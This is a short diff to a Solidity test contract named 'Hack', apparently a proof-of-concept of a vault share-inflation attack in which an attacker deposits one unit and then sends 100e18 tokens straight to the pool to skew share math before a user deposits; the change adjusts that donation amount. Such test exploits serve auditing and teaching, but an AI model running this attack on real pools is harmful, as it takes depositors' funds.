@@ -46,7 +46,7 @@ contract Hack is Test {
         pool.deposit(1);
 
         //now we transfer 100e18 tokens (yielding us no shares) to confuse the division
-        token.transfer(address(pool), 100e18-1);
+        token.transfer(address(pool), 100e18);
         vm.stopPrank();
         
         //now the user deposits all his tokens
